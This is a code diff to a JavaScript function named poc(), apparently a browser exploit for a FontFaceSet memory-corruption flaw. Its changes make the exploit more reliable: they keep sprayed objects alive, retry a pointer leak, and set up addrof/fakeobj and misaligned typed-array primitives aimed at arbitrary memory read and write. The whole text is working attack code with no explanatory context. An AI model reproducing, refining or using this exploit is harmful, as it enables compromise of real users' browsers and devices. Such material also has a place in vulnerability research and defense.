@@ -78,6 +78,8 @@ function poc() {
     var ite = true;
     var matches = 0;
 
+    var round = 0;
+    window.ffses = {};
     do {
 
         var p_s = ptrToString(NPAGES + 2); // vector.size()
@@ -88,36 +90,38 @@ function poc() {
         for (var i = 0; i < 256; i++)
             mkString(HASHMAP_BUCKET, p_s);
 
-        var ffs = new FontFaceSet(bad_fonts);
+        var ffs = ffses["search_" + (++round)] = new FontFaceSet(bad_fonts);
 
         var badstr1 = mkString(HASHMAP_BUCKET, p_s);
 
         var guessed_font = null;
         var guessed_addr = null;
 
-        for (var i = 0; i < SPRAY_FONTS; i++) {
-            bad_fonts[i].family = "evil";
-            if (badstr1.substr(0, p_s.length) != p_s) {
-                guessed_font = i;
-                var p_s1 = badstr1.substr(0, p_s.length);
-                for (var i = 1; i <= NPAGES; i++) {
-                    if (p_s1.substr(i * 8, 8) != p_s.substr(i * 8, 8)) {
-                        guessed_addr = stringToPtr(p_s.substr(i * 8, 8));
-                        break;
+        for(var i = 0; i < SPRAY_FONTS; i++)
+        {
+        bad_fonts[i].family = "search"+round;
+                if(badstr1.substr(0, p_s.length) != p_s)
+                {
+                    guessed_font = i;
+                    var p_s1 = badstr1.substr(0, p_s.length);
+                    for (var i = 1; i <= NPAGES; i++) {
+                        if (p_s1.substr(i * 8, 8) != p_s.substr(i * 8, 8)) {
+                            guessed_addr = stringToPtr(p_s.substr(i * 8, 8));
+                            break;
+                        }
                     }
+                    if (matches++ == 0) {
+                        guf = guessed_addr + 2 * PAGE_SIZE;
+                        guessed_addr = null;
+                    }
+                    break;
                 }
-                if (matches++ == 0) {
-                    guf = guessed_addr + 2 * PAGE_SIZE;
-                    guessed_addr = null;
-                }
-                break;
             }
+
+            if ((ite = !ite))
+                guf += NPAGES * PAGE_SIZE;
+
         }
-
-        if ((ite = !ite))
-            guf += NPAGES * PAGE_SIZE;
-
-    }
     while (guessed_addr === null);
 
     var p_s = '';
@@ -130,16 +134,22 @@ function poc() {
     for (var i = 0; i < 256; i++)
         mkString(HASHMAP_BUCKET, p_s);
 
-    var ffs2 = new FontFaceSet([bad_fonts[guessed_font], bad_fonts[guessed_font + 1], good_font]);
+// var needfix = [];
+for(var i = 0;; i++)
+{
+    var ffs2 = ffses["ffs_leak_"+i] = new FontFaceSet([bad_fonts[guessed_font], bad_fonts[guessed_font+1], good_font]);
     var badstr2 = mkString(HASHMAP_BUCKET, p_s);
     mkString(HASHMAP_BUCKET, p_s);
+    // needfix.push(mkString(HASHMAP_BUCKET, p_s));
 
     bad_fonts[guessed_font].family = "evil2";
     bad_fonts[guessed_font + 1].family = "evil3";
 
     var leak = stringToPtr(badstr2.substr(badstr2.length - 8));
-
-    var ffses = {};
+    if(leak < 0x1000000000000)
+        break;
+}
+    // var ffses = {};
 
     function makeReader(read_addr, ffs_name) {
         var fake_s = '';
@@ -162,6 +172,7 @@ function poc() {
         bad_fonts[guessed_font].family = ffs_name + "_evil1";
         bad_fonts[guessed_font + 1].family = ffs_name + "_evil2";
         bad_fonts[guessed_font + 2].family = ffs_name + "_evil3";
+    // needfix.push(relative_read);
         if (relative_read.length < 1000) //failed
             return makeReader(read_addr, ffs_name + '_');
         return relative_read;
@@ -255,10 +266,11 @@ function poc() {
     for (var i = 0; i < HAMMER_NSTRINGS; i++)
         mkString(HASHMAP_BUCKET, pp_s);
 
-    var ffs7 = new FontFaceSet(ffs7_args);
+var ffs7 = ffses.ffs7 = new FontFaceSet(ffs7_args);
     mkString(HASHMAP_BUCKET, pp_s);
-    var ffs8 = new FontFaceSet(ffs8_args);
-    mkString(HASHMAP_BUCKET, fake_s);
+var ffs8 = ffses.ffs8 = new FontFaceSet(ffs8_args);
+var post_ffs = mkString(HASHMAP_BUCKET, fake_s);
+// needfix.push(post_ffs);
 
     for (var i = 0; i < 13; i++)
         bad_fonts[guessed_font + i].family = "hammer" + i;
@@ -277,11 +289,15 @@ function poc() {
         return arrays[257][32];
     }
     //craft misaligned typedarray
+// addrof(null);
+// fakeobj(10);
 
     var arw_master = new Uint32Array(8);
     var arw_slave = new Uint32Array(2);
-
+    // var obj_master = new Uint32Array(8);
+    // var obj_slave = {obj: null};
     var addrof_slave = addrof(arw_slave);
+// var addrof_obj_slave = addrof(obj_slave);
     union_i[0] = structureid_low;
     union_i[1] = structureid_high;
     union_b[6] = 7;
